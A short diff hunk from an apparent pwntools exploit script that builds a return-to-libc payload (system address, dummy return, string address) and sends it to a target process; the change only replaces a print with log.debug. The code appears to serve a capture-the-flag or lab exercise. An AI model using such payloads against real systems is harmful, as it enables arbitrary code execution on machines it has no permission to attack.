@@ -40,7 +40,7 @@ def exploit(binary_path):
         payload += p32(system_addr)
         payload += p32(0x0)
         payload += p32(string_addr)
-        print("[DEBUG] The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
+        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
         # Send the payload and print the output
         io.sendline(payload)
